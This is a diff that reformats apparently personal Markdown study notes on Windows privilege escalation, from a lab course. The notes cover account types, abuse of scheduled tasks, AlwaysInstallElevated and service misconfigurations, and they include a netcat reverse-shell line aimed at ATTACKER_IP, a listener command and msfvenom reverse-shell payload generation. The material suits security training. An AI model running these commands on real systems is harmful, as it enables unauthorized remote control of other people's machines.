@@ -1,7 +1,5 @@
 # Privilege Escalation
 
-
-
 | SYSTEM / LocalSystem | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
 | :------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
 |     Local Service    |                               Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                               |
@@ -47,13 +45,23 @@
 
 `schtasks /query /tn vulntask /fo list /v` `icacls c:\tasks\schtask.bat` `nc64.exe` can be found on `C:\tools`
 
-**change the bat file to spawn a reverse shell:** `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
+**change the bat file to spawn a reverse shell:**
 
-then on attacking PC: `nc -lvp 4444`
+`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
+
+then on attacking PC:
+
+`nc -lvp 4444`
 
 ### AlwaysInstallElevated
 
-Windows installer files (.msi files) are used to install applications on the system. To be able to exploit this vulnerability, both should be set. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` If these are set, you can generate a malicious .msi file: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.153.40 LPORT=LOCAL_PORT -f msi -o malicious.msi`
+* Windows installer files (.msi files) are used to install applications on the system.
+* To be able to exploit this vulnerability, both should be set.
+* `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
+* `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+* If these are set, you can generate a malicious .msi file:
+* `msfvenom -p windows/x64/shell_reverse_tcp`
+* `LHOST=ATTACKING_10.10.153.40 LPORT=LOCAL_PORT -f msi -o malicious.msi`
 
 ## Abusing Service Misconfigurations
 
@@ -67,7 +75,11 @@ All of the services configurations are stored on the registry under `HKLM\SYSTEM
 
 #### Insecure Permissions on Service Executable
 
-**Splinterware System Scheduler:** `C:\> sc qc WindowsScheduler` We then proceed to check the permissions on the executable: `icacls`
+**Splinterware System Scheduler:**
+
+`C:\> sc qc WindowsScheduler`
+
+We then proceed to check the permissions on the executable: `icacls`
 
 Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
 
